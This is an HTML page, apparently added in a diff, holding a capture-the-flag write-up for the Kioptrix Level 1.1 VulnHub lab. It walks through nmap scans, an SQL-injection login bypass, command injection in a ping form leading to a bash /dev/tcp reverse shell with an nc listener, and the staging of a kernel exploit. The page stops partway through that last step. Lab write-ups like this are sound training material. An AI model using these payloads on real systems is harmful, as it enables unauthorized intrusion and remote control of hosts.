@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+    <writeup>
+        <h1><strong>#Kioptrix: Level 1.1</strong></h1>
+        <a href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">https://www.vulnhub.com/entry/kioptrix-level-11-2,23/</a><br>
+        <br>
+        This box is similar to Kioptrix 1 except there's a few more steps along the way.<br>
+        Not big ones, though.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>0) Find the VM's IP</strong></h3><br>
+        To find your VM's IP address, set your VM to ‘bridged’ so that it gets assigned an IP on your internal network and then use netdiscover to scan your network: <code>netdiscover -r &lt;internal network&gt;/24</code><br>
+        <br>
+        <code>netdiscover -r 192.168.1.1/24</code><br>
+        192.168.1.184 is my Kioptrix Level 1.1 box.<br>
+        Take a snapshot of the VM at this point, just to be safe.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 192.168.1.184</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix2#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;nmap<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix2#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>initial.txt&nbsp;192.168.1.184<br>
+                Starting&nbsp;Nmap&nbsp;7.70&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>nmap.org&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2019-04-06&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>26&nbsp;BST<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">Unknown</span>-00-0c-29-44-8d-1c.lan&nbsp;(192.168.1.184)<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.00054s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;994&nbsp;closed&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;VERSION<br>
+                22/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;3.9p1&nbsp;(protocol&nbsp;1.99)<br>
+                |&nbsp;ssh-hostkey:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;1024&nbsp;8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72&nbsp;(RSA1)<br>
+                |&nbsp;&nbsp;&nbsp;1024&nbsp;34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36&nbsp;(DSA)<br>
+                |_&nbsp;&nbsp;1024&nbsp;68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61&nbsp;(RSA)<br>
+                |_sshv1:&nbsp;Server&nbsp;supports&nbsp;SSHv1<br>
+                80/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.0.52&nbsp;((CentOS))<br>
+                |_http-server-header:&nbsp;Apache/2.0.52&nbsp;(CentOS)<br>
+                |_http-title:&nbsp;Site&nbsp;doesn't&nbsp;have&nbsp;a&nbsp;title&nbsp;(text/html;&nbsp;charset=UTF-8).<br>
+                111/tcp&nbsp;&nbsp;open&nbsp;&nbsp;rpcbind&nbsp;&nbsp;2&nbsp;(RPC&nbsp;#100000)<br>
+                |&nbsp;rpcinfo:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;program&nbsp;version&nbsp;&nbsp;&nbsp;port/proto&nbsp;&nbsp;service<br>
+                |&nbsp;&nbsp;&nbsp;100000&nbsp;&nbsp;2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;111/tcp&nbsp;&nbsp;rpcbind<br>
+                |&nbsp;&nbsp;&nbsp;100000&nbsp;&nbsp;2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;111/udp&nbsp;&nbsp;rpcbind<br>
+                |&nbsp;&nbsp;&nbsp;100024&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;615/udp&nbsp;&nbsp;status<br>
+                |_&nbsp;&nbsp;100024&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;618/tcp&nbsp;&nbsp;status<br>
+                443/tcp&nbsp;&nbsp;open&nbsp;&nbsp;ssl/http&nbsp;Apache&nbsp;httpd&nbsp;2.0.52&nbsp;((CentOS))<br>
+                |_http-server-header:&nbsp;Apache/2.0.52&nbsp;(CentOS)<br>
+                |_http-title:&nbsp;Site&nbsp;doesn't&nbsp;have&nbsp;a&nbsp;title&nbsp;(text/html;&nbsp;charset=UTF-8).<br>
+                |&nbsp;ssl-cert:&nbsp;Subject:&nbsp;commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--<br>
+                |&nbsp;Not&nbsp;valid&nbsp;before:&nbsp;2009-10-08T00:10:47<br>
+                |_Not&nbsp;valid&nbsp;after:&nbsp;&nbsp;2010-10-08T00:10:47<br>
+                |_ssl-date:&nbsp;2019-04-06T08:17:02+00:00;&nbsp;-3h09m37s&nbsp;from&nbsp;scanner&nbsp;time.<br>
+                |&nbsp;sslv2:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;SSLv2&nbsp;supported<br>
+                |&nbsp;&nbsp;&nbsp;ciphers:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSL2_RC2_128_CBC_EXPORT40_WITH_MD5<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSL2_RC4_64_WITH_MD5<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSL2_DES_192_EDE3_CBC_WITH_MD5<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSL2_RC2_128_CBC_WITH_MD5<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSL2_RC4_128_WITH_MD5<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSL2_DES_64_CBC_WITH_MD5<br>
+                |_&nbsp;&nbsp;&nbsp;&nbsp;SSL2_RC4_128_EXPORT40_WITH_MD5<br>
+                631/tcp&nbsp;&nbsp;open&nbsp;&nbsp;ipp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CUPS&nbsp;1.1<br>
+                |&nbsp;http-methods:&nbsp;<br>
+                |_&nbsp;&nbsp;Potentially&nbsp;risky&nbsp;methods:&nbsp;PUT<br>
+                |_http-server-header:&nbsp;CUPS/1.1<br>
+                |_http-title:&nbsp;403&nbsp;Forbidden<br>
+                3306/tcp&nbsp;open&nbsp;&nbsp;mysql&nbsp;&nbsp;&nbsp;&nbsp;MySQL&nbsp;(unauthorized)<br>
+                MAC&nbsp;Address:&nbsp;00:0C:29:44:8D:1C&nbsp;(VMware)<br>
+                Device&nbsp;type:&nbsp;general&nbsp;purpose<br>
+                Running:&nbsp;Linux&nbsp;2.6.X<br>
+                OS&nbsp;CPE:&nbsp;cpe:/o:linux:linux_kernel:2.6<br>
+                OS&nbsp;details:&nbsp;Linux&nbsp;2.6.9&nbsp;-&nbsp;2.6.30<br>
+                Network&nbsp;Distance:&nbsp;1&nbsp;hop<br>
+                <br>
+                Host&nbsp;script&nbsp;results:<br>
+                |_clock-skew:&nbsp;mean:&nbsp;-3h09m37s,&nbsp;deviation:&nbsp;0s,&nbsp;median:&nbsp;-3h09m37s<br>
+                <br>
+                OS&nbsp;and&nbsp;Service&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;https://nmap.org/submit/&nbsp;.<br>
+                Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;15.27&nbsp;seconds
+            </div>
+        </div><br>
+        <br>
+        • <strong>22/ssh</strong> we can't do anything without a username or a password to brute force.<br>
+        • <strong>80/http</strong> is a ‘Remote System Administration Login’ portal, how nice!<br>
+        • <strong>111/rpc</strong> is open. I'm not sure why :/<br>
+        • <strong>443/https</strong> is the same as 80/http<br>
+        • <strong>631/CUPS</strong> stands for ‘Common Unix Printing System’ and we're given a ‘Forbidden’ if trying to access it on http://192.168.1.184:631<br>
+        <br>
+        Full scan:<br>
+        <code>nmap -p- -sV -T4 -oN nmap</code><code><span style="color:#ff9d00;">/</span></code><code>full.txt 192.168.1.184</code><br>
+        <br>
+        -p- all ports<br>
+        -sV service enumeration<br>
+        -T4 speedier scan<br>
+        -oN default output<br>
+        <br>
+        I ran a full port scan, and found that mysql was open<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix2#&nbsp;nmap&nbsp;-p-&nbsp;-sV&nbsp;-T4&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>full.txt&nbsp;192.168.1.184<br>
+                Starting&nbsp;Nmap&nbsp;7.70&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>nmap.org&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2019-04-06&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>28&nbsp;BST<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">Unknown</span>-00-0c-29-44-8d-1c.lan&nbsp;(192.168.1.184)<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.0050s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;65528&nbsp;closed&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;VERSION<br>
+                22/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;3.9p1&nbsp;(protocol&nbsp;1.99)<br>
+                80/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.0.52&nbsp;((CentOS))<br>
+                111/tcp&nbsp;&nbsp;open&nbsp;&nbsp;rpcbind&nbsp;&nbsp;2&nbsp;(RPC&nbsp;#100000)<br>
+                443/tcp&nbsp;&nbsp;open&nbsp;&nbsp;ssl/http&nbsp;Apache&nbsp;httpd&nbsp;2.0.52&nbsp;((CentOS))<br>
+                618/tcp&nbsp;&nbsp;open&nbsp;&nbsp;status&nbsp;&nbsp;&nbsp;1&nbsp;(RPC&nbsp;#100024)<br>
+                631/tcp&nbsp;&nbsp;open&nbsp;&nbsp;ipp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CUPS&nbsp;1.1<br>
+                3306/tcp&nbsp;open&nbsp;&nbsp;mysql&nbsp;&nbsp;&nbsp;&nbsp;MySQL&nbsp;(unauthorized)<br>
+                MAC&nbsp;Address:&nbsp;00:0C:29:44:8D:1C&nbsp;(VMware)<br>
+                <br>
+                Service&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;https://nmap.org/submit/&nbsp;.<br>
+                Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;17.80&nbsp;seconds
+            </div>
+        </div><br>
+        <br>
+        But upon trying to connect remotely, you're denied:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix2#&nbsp;mysql&nbsp;-h&nbsp;192.168.1.184<br>
+                ERROR&nbsp;1130&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>HY000<span style="color:#ff9d00;font-weight:700">):</span>&nbsp;Host&nbsp;<span style="color:#3ad900;font-weight:400">'kali.lan'</span>&nbsp;is&nbsp;not&nbsp;allowed&nbsp;to&nbsp;connect&nbsp;to&nbsp;this&nbsp;MySQL&nbsp;server
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) SQL Injection</strong></h2><br>
+        When visiting the website, you're presented with this:<br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        My first thought upon seeing a form like this is sql injection.<br>
+        username: <code>admin</code><br>
+        password: <code>' OR '1</code><br>
+        <br>
+        Nice!<br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) Command Injection</strong></h2><br>
+        ‘Ping a Machine on the Network:’ looks like command injection. It asks us to provide an IP to ping in the web form, meaning that this page is running linux commands for us. All we have to do is escape the current command by ending it (<code>;</code>) and inserting whatever system command we like (<code>whoami</code>)<br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        I entered <code>; ls /bin</code> to check what reverse shells I could create, and then ran one using bash.<br>
+        <br>
+        Start a listener on the kali machine to receive the shell:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix2#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        And then run the reverse shell using the web form:<br>
+        <code>; bash -i &gt;&amp; /dev/tcp/192.168.1.183/9001 0&gt;&amp;1</code><br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        You should receive a shell on your listener!:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix2#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[192.168.1.183]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[192.168.1.184]&nbsp;32769<br>
+                <span style="color:#ff9d00;font-weight:700">bash:</span>&nbsp;no&nbsp;job&nbsp;control&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;this&nbsp;shell<br>
+                bash-3.00$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                index.php<br>
+                pingit.php<br>
+                bash-3.00$&nbsp;<span style="color:#ff9d00;font-weight:700">id</span><br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=48<span style="color:#ff9d00;font-weight:700">(</span>apache<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=48<span style="color:#ff9d00;font-weight:700">(</span>apache<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=48<span style="color:#ff9d00;font-weight:700">(</span>apache<span style="color:#ff9d00;font-weight:700">)</span><br>
+                bash-3.00$&nbsp;
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) ring0</strong></h2><br>
+        I gathered some info first:<br>
+        <br>
+            <div class="codebox">
+                bash-3.00$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;&nbsp;4&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;4.0K&nbsp;Oct&nbsp;12&nbsp;&nbsp;2009&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;23&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;4.0K&nbsp;Apr&nbsp;&nbsp;6&nbsp;04<span style="color:#ff9d00;font-weight:700">:</span>11&nbsp;..<br>
+                drwx------&nbsp;&nbsp;&nbsp;2&nbsp;harold&nbsp;harold&nbsp;4.0K&nbsp;Oct&nbsp;12&nbsp;&nbsp;2009&nbsp;harold<br>
+                drwx------&nbsp;&nbsp;&nbsp;2&nbsp;john&nbsp;&nbsp;&nbsp;john&nbsp;&nbsp;&nbsp;4.0K&nbsp;Oct&nbsp;&nbsp;8&nbsp;&nbsp;2009&nbsp;john<br>
+                <br>
+                bash-3.00$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>*-release<br>
+                CentOS&nbsp;release&nbsp;4.5&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Final<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                bash-3.00$&nbsp;<span style="color:#ff9d00;font-weight:700">uname</span>&nbsp;-mrs<br>
+                Linux&nbsp;2.6.9-55.EL&nbsp;i686<br>
+                <br>
+                bash-3.00$&nbsp;<span style="color:#ff9d00;font-weight:700">uname</span>&nbsp;-a<br>
+                Linux&nbsp;kioptrix.level2&nbsp;2.6.9-55.EL&nbsp;<span style="color:#0088ff;font-weight:400">#1&nbsp;Wed&nbsp;May&nbsp;2&nbsp;13:52:16&nbsp;EDT&nbsp;2007&nbsp;i686&nbsp;i686&nbsp;i386&nbsp;GNU/Linux</span><br>
+                <br>
+                bash-3.00$&nbsp;<span style="color:#ff9d00;font-weight:700">ps</span>&nbsp;aux&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;root<br>
+                ...<br>
+                root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3140&nbsp;&nbsp;0.0&nbsp;&nbsp;0.9&nbsp;&nbsp;5980&nbsp;1236&nbsp;?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S&nbsp;&nbsp;&nbsp;&nbsp;04<span style="color:#ff9d00;font-weight:700">:</span>12&nbsp;&nbsp;&nbsp;0<span style="color:#ff9d00;font-weight:700">:</span>00&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>mysqld_safe&nbsp;--datadir=<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>mysql&nbsp;--socket=<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>mysql<span style="color:#ff9d00;font-weight:700">/</span>mysql.sock&nbsp;--err-log=<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>log<span style="color:#ff9d00;font-weight:700">/</span>mysqld.log&nbsp;--pid-file=<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>run<span style="color:#ff9d00;font-weight:700">/</span>mysqld<span style="color:#ff9d00;font-weight:700">/</span>mysqld.pid<br>
+                ...<br>
+                <br>
+                bash-3.00$&nbsp;<span style="color:#ff9d00;font-weight:700">find</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;-perm&nbsp;-u=s&nbsp;-type&nbsp;f&nbsp;2&gt;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        No exploitable SUID binaries - <code>find / -perm -u=s -type f 2&gt;/dev/null</code><br>
+        mysql was running as root - <code>ps aux | grep root</code> - and was accessible without a password, but I couldn't find anything useful inside/to do with it.<br>
+            <div class="codebox">
+                bash-3.00$&nbsp;mysql<br>
+                mysql<br>
+                Welcome&nbsp;to&nbsp;the&nbsp;MySQL&nbsp;monitor.&nbsp;&nbsp;Commands&nbsp;end&nbsp;with&nbsp;<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;or&nbsp;<span style="color:#333333;font-weight:400">\g</span>.<br>
+                Your&nbsp;MySQL&nbsp;connection&nbsp;<span style="color:#ff9d00;font-weight:700">id</span>&nbsp;is&nbsp;586&nbsp;to&nbsp;server&nbsp;version<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;4.1.22<br>
+                <br>
+                Type&nbsp;<span style="color:#3ad900;font-weight:400">'help;'</span>&nbsp;or&nbsp;<span style="color:#3ad900;font-weight:400">'\h'</span>&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">help</span>.&nbsp;Type&nbsp;'\c'&nbsp;to&nbsp;clear&nbsp;the&nbsp;buffer.<br>
+                <br>
+                mysql&gt;&nbsp;SHOW&nbsp;DATABASES;<br>
+                SHOW&nbsp;DATABASES;<br>
+                +----------+<br>
+                |&nbsp;Database&nbsp;|<br>
+                +----------+<br>
+                |&nbsp;test&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+                +----------+<br>
+                1&nbsp;row&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">set</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>0.00&nbsp;sec<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                mysql&gt;&nbsp;USE&nbsp;<span style="color:#ff9d00;font-weight:700">test;</span><br>
+                USE&nbsp;<span style="color:#ff9d00;font-weight:700">test;</span><br>
+                Database&nbsp;changed<br>
+                mysql&gt;&nbsp;SHOW&nbsp;TABLES<span style="color:#ff9d00;font-weight:700">;</span><br>
+                SHOW&nbsp;TABLES<span style="color:#ff9d00;font-weight:700">;</span><br>
+                Empty&nbsp;<span style="color:#ff9d00;font-weight:700">set</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>0.00&nbsp;sec<span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        <br>
+        I only found 1 method to get root on this machine, and that was using an exploit.<br>
+        I got kernel and distro information from <code>cat /etc/*-release</code> and <code>uname -mrs</code> in the initial block of commands.<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix2#&nbsp;searchsploit&nbsp;centOS&nbsp;4.5&nbsp;linux&nbsp;kernel&nbsp;2.6<br>
+                -------------------------------------------------------------&nbsp;<br>
+                &nbsp;Exploit&nbsp;Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;Path<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>exploitdb<span style="color:#ff9d00;font-weight:700">/)</span><br>
+                -------------------------------------------------------------&nbsp;<br>
+                Linux&nbsp;Kernel&nbsp;2.6&nbsp;&lt;&nbsp;2.6.19&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>White&nbsp;Box&nbsp;4&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;CentOS&nbsp;4.4<span style="color:#ff9d00;font-weight:700">/</span>4.5&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;Fe&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>linux_x86<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>9542.c<br>
+                -------------------------------------------------------------&nbsp;
+            </div>
+        </div><br>
+        <br>
+        I copied and served the exploit to my victim machine using <code>python -m SimpleHTTPServer</code><br>
+            <div class="codebox">
+                root<span style="color:#ff9d00;font-weight:400">@</span>kali<span style="color:#ff9d00;font-weight:400">:~/</span>ctf<span style="color:#ff9d00;font-weight:400">/</span>kioptrix2#&nbsp;mkdir&nbsp;exploits<br>
+                root<span style="color:#ff9d00;font-weight:400">@</span>kali<span style="color:#ff9d00;font-weight:400">:~/</span>ctf<span style="color:#ff9d00;font-weight:400">/</span>kioptrix2#&nbsp;cd&nbsp;exploits<br>
+                root<span style="color:#ff9d00;font-weight:400">@</span>kali<span style="color:#ff9d00;font-weight:400">:~/</span>ctf<span style="color:#ff9d00;font-weight:400">/</span>kioptrix2<span style="color:#ff9d00;font-weight:400">/</span>exploits#&nbsp;cp&nbsp;<span style="color:#ff9d00;font-weight:400">/</span>usr<span style="color:#ff9d00;font-weight:400">/</span>share<span style="color:#ff9d00;font-weight:400">/</span>exploitdb<span style="color:#ff9d00;font-weight:400">/</span>exploits<span style="color:#ff9d00;font-weight:400">/</span>linux<span style="color:#ff9d00;font-weight:400">_</span>x86<span style="color:#ff9d00;font-weight:400">/</span>local<span style="color:#ff9d00;font-weight:400">/</span><span style="color:#ff0044;font-weight:400">9542</span><span style="color:#ff9d00;font-weight:400">.</span>c&nbsp;<span style="color:#ff9d00;font-weight:400">.</span><br>
+                root<span style="color:#ff9d00;font-weight:400">@</span>kali<span style="color:#ff9d00;font-weight:400">:~/</span>ctf<span style="color:#ff9d00;font-weight:400">/</span>kioptrix2<span style="color:#ff9d00;font-weight:400">/</span>exploits#&nbsp;ls<br>
+                <span style="color:#ff0044;font-weight:400">9542</span><span style="color:#ff9d00;font-weight:400">.</span>c<br>
+                root<span style="color:#ff9d00;font-weight:400">@</span>kali<span style="color:#ff9d00;font-weight:400">:~/</span>ctf<span style="color:#ff9d00;font-weight:400">/</span>kioptrix2<span style="color:#ff9d00;font-weight:400">/</span>exploits#&nbsp;mv&nbsp;<span style="color:#ff0044;font-weight:400">9542</span><span style="color:#ff9d00;font-weight:400">.</span>c&nbsp;<span style="color:#ff0044;font-weight:400">9542</span><br>
+                root<span style="color:#ff9d00;font-weight:400">@</span>kali<span style="color:#ff9d00;font-weight:400">:~/</span>ctf<span style="color:#ff9d00;font-weight:400">/</span>kioptrix2<span style="color:#ff9d00;font-weight:400">/</span>exploits#&nbsp;python&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>m&nbsp;SimpleHTTPServer<br>
